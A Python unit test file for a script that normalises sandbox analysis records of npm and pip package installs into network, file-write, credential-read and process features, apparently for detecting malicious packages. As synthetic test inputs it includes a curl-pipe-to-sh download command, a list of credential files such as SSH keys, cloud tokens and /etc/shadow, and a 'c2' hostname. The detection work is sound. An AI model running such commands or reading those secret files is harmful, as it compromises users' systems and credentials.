"""Unit tests for scripts/normalise.py on hand-written synthetic records only.

Run: python3 -m unittest discover -s tests -v
All hostnames below use reserved example names (RFC 2606 / RFC 6761) or documentation addresses
(RFC 5737 / RFC 3849).
"""

import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts"))
import normalise as n  # noqa: E402

PSL_TEXT = """
// synthetic list for tests
com
org
uk
co.uk
example
*.ck
!www.ck
// ===BEGIN PRIVATE DOMAINS===
pages.example
"""
PSL = n.PSL(PSL_TEXT)


def rec(**phase):
    phase.setdefault("Status", "completed")
    return {"Package": {"Ecosystem": "npm", "Name": "synthetic", "Version": "1.0.0"},
            "CreatedTimestamp": 0, "Analysis": {"install": phase}}


class PublicSuffix(unittest.TestCase):
    def test_registrable(self):
        self.assertEqual(PSL.registrable("a.b.example.com"), "example.com")
        self.assertEqual(PSL.registrable("www.example.co.uk"), "example.co.uk")
        self.assertEqual(PSL.registrable("x.y.ck"), "x.y.ck")       # wildcard *.ck: y.ck is a suffix
        self.assertEqual(PSL.registrable("www.ck"), "www.ck")       # exception !www.ck
        self.assertEqual(PSL.registrable("a.www.ck"), "www.ck")
        self.assertEqual(PSL.registrable("site.pages.example"), "site.pages.example")  # private section
        self.assertIsNone(PSL.registrable("co.uk"))                 # a public suffix itself
        self.assertEqual(PSL.registrable("host.unlisted"), "host.unlisted")  # default rule *

    def test_real_list_if_present(self):
        if not os.path.exists(n.PSL_PATH):
            self.skipTest("pinned PSL not downloaded")
        psl = n.load_psl()
        self.assertEqual(psl.registrable("a.b.example.co.uk"), "example.co.uk")
        self.assertEqual(psl.registrable("user.github.io"), "user.github.io")


class Network(unittest.TestCase):
    def items(self, **phase):
        return n.network_items(rec(**phase)["Analysis"]["install"], PSL)

    def test_n1_lowercase_trailing_dot_registrable(self):
        self.assertEqual(self.items(DNS=[{"Class": "IN", "Queries": [{"Hostname": "API.Example.COM.", "Types": ["A"]}]}]),
                         {"example.com"})

    def test_n1_public_suffix_and_unparsable_kept(self):
        got = self.items(DNS=[{"Class": "IN", "Queries": [{"Hostname": "co.uk"}, {"Hostname": "bad host!"}]}])
        self.assertEqual(got, {"co.uk", "bad host!"})

    def test_n2_socket_with_hostnames_ignores_address(self):
        got = self.items(Sockets=[{"Address": "192.0.2.10", "Port": 443, "Hostnames": ["cdn.example.org", "b.example.org"]}])
        self.assertEqual(got, {"example.org"})

    def test_n3_without_hostname(self):
        socks = [{"Address": a, "Port": 1} for a in (
            "127.0.0.1", "::1", "10.1.2.3", "172.16.0.9", "192.168.1.1", "100.64.0.1", "fd12::1",
            "169.254.1.1", "fe80::1", "0.0.0.0", "::", "224.0.0.1", "not-an-ip", "")]
        self.assertEqual(self.items(Sockets=socks), set())
        self.assertEqual(self.items(Sockets=[{"Address": "169.254.169.254", "Port": 80}]), {"cloud-metadata"})
        self.assertEqual(self.items(Sockets=[{"Address": "fd00:ec2::254", "Port": 80}]), {"cloud-metadata"})
        self.assertEqual(self.items(Sockets=[{"Address": "198.51.100.7", "Port": 80},
                                             {"Address": "2001:db8::5", "Port": 443}]), {"ip-literal"})

    def test_n1_ip_literal_hostname_uses_n3(self):
        self.assertEqual(self.items(DNS=[{"Queries": [{"Hostname": "198.51.100.7"}]}]), {"ip-literal"})

    def test_n4_self_traffic_dropped(self):
        hosts = ["registry.npmjs.org", "www.npmjs.com", "registry.yarnpkg.com", "pypi.org", "files.pythonhosted.org"]
        got = self.items(DNS=[{"Queries": [{"Hostname": h} for h in hosts]}],
                         Sockets=[{"Address": "192.0.2.1", "Port": 443, "Hostnames": ["registry.npmjs.org"]}])
        self.assertEqual(got, set())

    def test_n5_ports_ignored(self):
        a = self.items(Sockets=[{"Address": "192.0.2.1", "Port": 443, "Hostnames": ["x.example.com"]}])
        b = self.items(Sockets=[{"Address": "192.0.2.1", "Port": 8443, "Hostnames": ["x.example.com"]}])
        self.assertEqual(a, b)


class FileWrites(unittest.TestCase):
    def items(self, files):
        return n.write_items(rec(Files=files)["Analysis"]["install"])

    def test_f1(self):
        self.assertEqual(n.f1("//root//a/./b/../c"), "~/a/c")
        self.assertEqual(n.f1("/home/user/x"), "~/x")
        self.assertEqual(n.f1("/root"), "~")
        self.assertEqual(n.f1("/rootfs/x"), "/rootfs/x")

    def test_f2_dropped(self):
        paths = ["/tmp/a", "/var/tmp/b", "/dev/null", "/proc/self/fd/3", "/sys/x", "/run/y",
                 "/root/.npm/_cacache/x", "/root/.cache/pip/y", "/root/.node-gyp/z", "/root/.yarn/w",
                 "/root/.bun/install/cache/v", "/app/pkg/__pycache__/m.cpython-312.pyc", "/app/m.pyc",
                 "/app/node_modules/p/index.js", "/usr/lib/python3/dist-packages/q.py",
                 "/app/.pyenv/lib/python3.12/site-packages/r.py", "/opt/site-packages/s.py",
                 "/app/.pyenv/bin/tool", "/usr/local/lib/node_modules/g/x", "/app/package.json",
                 "/app/package-lock.json"]
        self.assertEqual(self.items([{"Path": p, "Read": False, "Write": True, "Delete": False} for p in paths]), set())

    def test_f2_kept_and_read_only_ignored(self):
        got = self.items([{"Path": "/etc/cron.d/job", "Read": False, "Write": True, "Delete": False},
                          {"Path": "/root/.bashrc", "Read": True, "Write": True, "Delete": False},
                          {"Path": "/etc/hosts", "Read": True, "Write": False, "Delete": False},
                          {"Path": "/app/sub/package.json", "Read": False, "Write": True, "Delete": False}])
        self.assertEqual(got, {"/etc/cron.d/job", "~/.bashrc", "/app/sub/package.json"})

    def test_f3(self):
        self.assertEqual(n.f3("/var/log/run-2024-05-01.log"), "/var/log/run-N-N-N.log")
        self.assertEqual(n.f3("/srv/a1b2c3d4e5f6a7b8c9/x"), "/srv/X/x")
        self.assertEqual(n.f3("/srv/abcdefghijklmnopqrst/x"), "/srv/abcdefghijklmnopqrst/x")  # no digit: kept
        self.assertEqual(n.f3("/srv/1234567890123456/x"), "/srv/N/x")  # no letter: digits rule only


class Credentials(unittest.TestCase):
    def items(self, files):
        return n.credential_items(rec(Files=files)["Analysis"]["install"])

    def test_every_entry(self):
        cases = {
            "/root/.npmrc": "~/.npmrc", "/root/.pypirc": "~/.pypirc", "/root/.netrc": "~/.netrc",
            "/root/.git-credentials": "~/.git-credentials", "/root/.ssh/id_rsa": "~/.ssh/*",
            "/home/u/.ssh/known_hosts": "~/.ssh/*", "/root/.aws/credentials": "~/.aws/credentials",
            "/root/.aws/config": "~/.aws/config", "/proc/self/environ": "/proc/*/environ",
            "/proc/42/environ": "/proc/*/environ",
            "/root/.config/gcloud/application_default_credentials.json": "~/.config/gcloud/**",
            "/root/.config/gcloud/configurations/config_default": "~/.config/gcloud/**",
            "/root/.azure/accessTokens.json": "~/.azure/**", "/root/.kube/config": "~/.kube/config",
            "/root/.docker/config.json": "~/.docker/config.json",
            "/root/.config/gh/hosts.yml": "~/.config/gh/hosts.yml",
            "/root/.bash_history": "~/.bash_history", "/root/.zsh_history": "~/.zsh_history",
            "/etc/shadow": "/etc/shadow", "/app/.env": ".env", "/srv/x/.env.local": ".env",
        }
        for path, entry in cases.items():
            with self.subTest(path=path):
                self.assertEqual(self.items([{"Path": path, "Read": True, "Write": False, "Delete": False}]), {entry})

    def test_not_listed(self):
        for path in ("/root/.gitconfig", "/root/.ssh/sub/key", "/root/.npmrc.bak", "/etc/passwd",
                     "/app/.envrc", "/root/.aws/cli/cache/x", "/proc/self/status"):
            with self.subTest(path=path):
                self.assertEqual(self.items([{"Path": path, "Read": True, "Write": False, "Delete": False}]), set())

    def test_requires_read(self):
        self.assertEqual(self.items([{"Path": "/root/.npmrc", "Read": False, "Write": True, "Delete": False}]), set())


class Processes(unittest.TestCase):
    def test_p1(self):
        self.assertEqual(n.process_item(["/usr/bin/Curl", "-s"]), "curl")
        self.assertEqual(n.process_item(["/usr/bin/python3.12"]), "python")
        self.assertEqual(n.process_item(["/usr/bin/node20"]), "node")
        self.assertEqual(n.process_item(["/usr/bin/x86_64-linux-gnu-gcc"]), "x86_64-linux-gnu-gcc")

    def test_p2_env(self):
        self.assertEqual(n.process_item(["/usr/bin/env", "A=1", "B=2", "/usr/bin/wget", "-q"]), "wget")
        self.assertEqual(n.process_item(["env", "A=1"]), "env")

    def test_p3_shell_unwrap_once(self):
        self.assertEqual(n.process_item(["/bin/sh", "-c", "curl -s https://host.example/x | sh"]), "curl")
        self.assertEqual(n.process_item(["bash", "-c", "sh -c 'wget x'"]), "sh")
        self.assertEqual(n.process_item(["sh", "-c", "node /app/node_modules/p/install.js"]), "node install.js")
        self.assertEqual(n.process_item(["sh", "script.sh"]), "sh")
        self.assertEqual(n.process_item(["sh", "-c", "echo 'unbalanced"]), "echo")

    def test_p4_tools(self):
        self.assertEqual(n.process_item(["npm", "install", "x"]), "npm install")
        self.assertEqual(n.process_item(["/usr/bin/npm", "--no-audit", "init", "--force"]), "npm init")
        self.assertEqual(n.process_item(["node", "/app/node_modules/p/setup.js"]), "node setup.js")
        self.assertEqual(n.process_item(["/app/.pyenv/bin/python3", "-m", "pip", "install", "y"]), "python pip")
        self.assertEqual(n.process_item(["pip3", "install", "--pre", "z"]), "pip install")
        self.assertEqual(n.process_item(["bun", "run", "build2024"]), "bun run")
        self.assertEqual(n.process_item(["node", "bundle-a1b2c3d4e5f6g7h8i9.js"]), "node X.js")
        self.assertEqual(n.process_item(["node", "v2/run.js"]), "node run.js")
        self.assertEqual(n.process_item(["yarn"]), "yarn")
        self.assertEqual(n.process_item(["pnpm", "--silent"]), "pnpm")
        self.assertEqual(n.process_item(["npx", "pkg@1.2.3"]), "npx pkg@N.N.N")

    def test_p4_inline_flags(self):
        self.assertEqual(n.process_item(["node", "-e", "require('child_process')"]), "node -e")
        self.assertEqual(n.process_item(["node", "--eval", "x()"]), "node --eval")
        self.assertEqual(n.process_item(["node", "--eval=x()"]), "node --eval")
        self.assertEqual(n.process_item(["node", "-p", "1+1"]), "node -p")
        self.assertEqual(n.process_item(["node", "--print", "1"]), "node --print")
        self.assertEqual(n.process_item(["python3", "-c", "import os"]), "python -c")
        self.assertEqual(n.process_item(["python3", "-u", "-c", "import os"]), "python -c")
        self.assertEqual(n.process_item(["node", "script.js", "-e", "x"]), "node script.js")  # flag after non-flag
        self.assertEqual(n.process_item(["sh", "-c", "node -e 'x'"]), "node -e")

    def test_p5_other(self):
        self.assertEqual(n.process_item(["/usr/bin/git", "clone", "u"]), "git")
        self.assertEqual(n.process_item(["/usr/local/bin/trufflehog", "filesystem", "/"]), "trufflehog")

    def test_empty(self):
        self.assertIsNone(n.process_item([]))
        self.assertIsNone(n.process_item(None))


class RecordLevel(unittest.TestCase):
    def test_evaluable(self):
        self.assertTrue(n.evaluable(rec()))
        self.assertFalse(n.evaluable(rec(Status="error_timeout")))
        self.assertFalse(n.evaluable({"Analysis": {"import": {"Status": "completed"}}}))
        self.assertFalse(n.evaluable({}))

    def test_new_items(self):
        old = rec(Commands=[{"Command": ["npm", "install", "p"], "Environment": []}],
                  Files=[{"Path": "/root/.npmrc", "Read": True, "Write": False, "Delete": False}])
        new = rec(Commands=[{"Command": ["npm", "install", "p"], "Environment": []},
                            {"Command": ["node", "-e", "x"], "Environment": []}],
                  Files=[{"Path": "/root/.npmrc", "Read": True, "Write": False, "Delete": False},
                         {"Path": "/root/.ssh/id_rsa", "Read": True, "Write": False, "Delete": False},
                         {"Path": "/etc/cron.d/j", "Read": False, "Write": True, "Delete": False}],
                  DNS=[{"Class": "IN", "Queries": [{"Hostname": "c2.example.com"}]}])
        d = n.new_items(n.items(old, PSL), n.items(new, PSL))
        self.assertEqual(d, {"network": {"example.com"}, "file_write": {"/etc/cron.d/j"},
                             "credential": {"~/.ssh/*"}, "process": {"node -e"}})
        same = n.new_items(n.items(new, PSL), n.items(new, PSL))
        self.assertTrue(all(not v for v in same.values()))

    def test_missing_fields(self):
        self.assertEqual(n.items(rec(), PSL), {c: set() for c in n.CATEGORIES})


if __name__ == "__main__":
    unittest.main()
